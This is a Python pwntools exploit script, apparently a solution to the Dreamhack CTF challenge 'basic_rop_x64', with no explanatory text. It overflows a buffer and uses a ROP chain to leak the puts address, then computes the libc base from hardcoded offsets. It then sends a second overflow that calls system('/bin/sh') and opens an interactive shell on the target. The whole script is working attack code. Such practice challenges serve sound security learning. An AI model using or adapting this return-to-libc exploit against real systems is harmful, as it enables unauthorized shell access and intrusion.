from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/rop64/basic_rop_x64')
p=elf.process()

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:18360'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

pop_rdi_ret = 0x400883
ret = 0x4005a9
puts_plt = elf.plt[b'puts']
puts_got = elf.got[b'puts']
main = 0x4007ba

payload = b"A"*63 + b"S" + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload)

p.recvuntil(b"S")
data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))

print(f"puts ist {hex(val)}!")

puts_offset = 0x084ed0
system_offset = 0x054d60
binsh_offset = 0x1dc698

libc = val - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

payload = b"A"*63 + b"S" + b"B"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
p.send(payload)

p.interactive()
